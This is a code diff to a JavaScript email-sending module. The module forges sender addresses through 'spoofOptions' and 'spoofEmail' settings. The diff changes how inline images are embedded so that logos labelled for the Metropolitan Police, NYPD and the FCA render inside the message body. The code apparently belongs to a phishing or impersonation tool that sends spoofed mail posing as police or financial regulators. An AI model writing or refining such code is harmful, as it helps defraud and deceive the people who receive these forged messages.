@@ -359,11 +359,11 @@ async function sendEmail(smtpConfig, mailOptions, spoofOptions = {}) {
   const fromEmail = spoofOptions.fromEmail || smtpConfig.spoofEmail || smtpConfig.user;
   const replyTo = spoofOptions.replyTo || fromEmail;
   
-  const finalMailOptions = applyFromHeaders(smtpConfig, {
+  const finalMailOptions = attachCidImages(applyFromHeaders(smtpConfig, {
     ...mailOptions,
     from: fromName ? `"${fromName}" <${fromEmail}>` : fromEmail,
     replyTo,
-  });
+  }));
   
   return await transporter.sendMail(finalMailOptions);
 }
@@ -392,26 +392,30 @@ function attachSenderImage(mailOptions, profilePicPath, base64Image) {
     if (dataUrlMatch) {
       const ext = dataUrlMatch[1].split('/')[1];
       attachment = {
-        filename: `sender-image.${ext}`,
+        filename: `logo.${ext === 'jpeg' ? 'jpg' : ext}`,
         content: Buffer.from(dataUrlMatch[2], 'base64'),
         cid: 'sender-image@wxcked',
         contentType: dataUrlMatch[1],
+        contentDisposition: 'inline',
       };
     } else {
       attachment = {
-        filename: 'sender-image.jpg',
+        filename: 'logo.jpg',
         content: Buffer.from(base64Image, 'base64'),
         cid: 'sender-image@wxcked',
         contentType: 'image/jpeg',
+        contentDisposition: 'inline',
       };
     }
   } else if (profilePicPath) {
     try {
       if (fs.existsSync(profilePicPath)) {
         attachment = {
-          filename: 'sender-image.jpg',
+          filename: 'logo.jpg',
           path: profilePicPath,
           cid: 'sender-image@wxcked',
+          contentType: 'image/jpeg',
+          contentDisposition: 'inline',
         };
       }
     } catch (e) {
@@ -436,32 +440,98 @@ function attachSenderImage(mailOptions, profilePicPath, base64Image) {
   return mailOptions;
 }
 
-const CID_FILES = {
-  metlogo: path.join(__dirname, '..', 'templates', 'm.jpg'),
-  metlogo2: path.join(__dirname, '..', 'templates', 'm.jpg'),
-  nypdlogo: path.join(__dirname, '..', 'templates', 'nypd.png'),
-  fcalogo: path.join(__dirname, '..', 'public', 'assets', 'fca.png'),
+const CID_DIRS = [
+  path.join(__dirname, '..', 'templates'),
+  path.join(__dirname, '..', 'public', 'assets'),
+];
+const CID_ALIASES = {
+  metlogo: ['m.jpg', 'metlogo.jpg', 'm'],
+  metlogo2: ['m.jpg', 'metlogo.jpg', 'm'],
+  nypdlogo: ['nypd.png', 'nypdlogo.png', 'nypd'],
+  fcalogo: ['fca.png', 'fca'],
 };
 
-function attachCidImages(mailOptions) {
-  const html = String(mailOptions.html || '');
-  const found = [...html.matchAll(/cid:([a-zA-Z0-9._-]+)/g)].map(m => m[1]);
-  if (!found.length) return mailOptions;
-  mailOptions.attachments = mailOptions.attachments || [];
-  const used = new Set(mailOptions.attachments.map(a => a.cid).filter(Boolean));
-  for (const cid of found) {
-    if (used.has(cid)) continue;
-    const file = CID_FILES[cid];
-    if (!file || !fs.existsSync(file)) continue;
-    mailOptions.attachments.push({
-      filename: path.basename(file),
-      path: file,
-      cid,
-      contentType: file.toLowerCase().endsWith('.png') ? 'image/png' : 'image/jpeg',
-    });
-    used.add(cid);
+function mimeForImage(file) {
+  const ext = path.extname(file).toLowerCase();
+  if (ext === '.png') return 'image/png';
+  if (ext === '.gif') return 'image/gif';
+  if (ext === '.webp') return 'image/webp';
+  if (ext === '.svg') return 'image/svg+xml';
+  return 'image/jpeg';
+}
+
+function listImageFiles() {
+  const files = [];
+  for (const dir of CID_DIRS) {
+    if (!fs.existsSync(dir)) continue;
+    for (const name of fs.readdirSync(dir)) {
+      if (!/\.(png|jpe?g|gif|webp)$/i.test(name)) continue;
+      files.push(path.join(dir, name));
+    }
   }
-  return mailOptions;
+  return files;
+}
+
+function resolveCidFile(cid) {
+  const key = String(cid || '').split('@')[0].toLowerCase();
+  if (!key) return '';
+  const byBase = new Map();
+  for (const file of listImageFiles()) {
+    const base = path.basename(file).toLowerCase();
+    const stem = base.replace(/\.[^.]+$/, '');
+    if (!byBase.has(base)) byBase.set(base, file);
+    if (!byBase.has(stem)) byBase.set(stem, file);
+  }
+  if (byBase.has(key)) return byBase.get(key);
+  for (const alias of (CID_ALIASES[key] || [])) {
+    const hit = byBase.get(String(alias).toLowerCase());
+    if (hit) return hit;
+  }
+  return '';
+}
+
+function inlinePart(part) {
+  if (!part) return part;
+  const image = /image\//i.test(part.contentType || '')
+    || /\.(png|jpe?g|gif|webp)$/i.test(part.filename || '')
+    || !!part.cid;
+  if (!image) return part;
+  return { ...part, contentDisposition: 'inline' };
+}
+
+function attachCidImages(mailOptions) {
+  try {
+    let html = String(mailOptions.html || '');
+    const found = [...html.matchAll(/cid:([a-zA-Z0-9._@-]+)/g)].map(m => m[1]);
+    mailOptions.attachments = (mailOptions.attachments || []).map(inlinePart);
+    if (!found.length) return mailOptions;
+    const used = new Set(mailOptions.attachments.map(a => a && a.cid).filter(Boolean));
+    for (const raw of found) {
+      const bare = String(raw).split('@')[0];
+      const file = resolveCidFile(bare);
+      const inlineCid = bare.includes('@') ? raw : bare + '@wxcked';
+      if (raw !== inlineCid) html = html.split('cid:' + raw).join('cid:' + inlineCid);
+      if (!file) continue;
+      if (used.has(inlineCid) || used.has(raw) || used.has(bare)) continue;
+      const ext = path.extname(file) || '.png';
+      mailOptions.attachments.push({
+        filename: bare + ext,
+        path: file,
+        cid: inlineCid,
+        contentType: mimeForImage(file),
+        contentDisposition: 'inline',
+        headers: {
+          'Content-ID': `<${inlineCid}>`,
+          'X-Attachment-Id': inlineCid,
+        },
+      });
+      used.add(inlineCid);
+    }
+    mailOptions.html = html;
+    return mailOptions;
+  } catch (e) {
+    return mailOptions;
+  }
 }
 
 module.exports = {
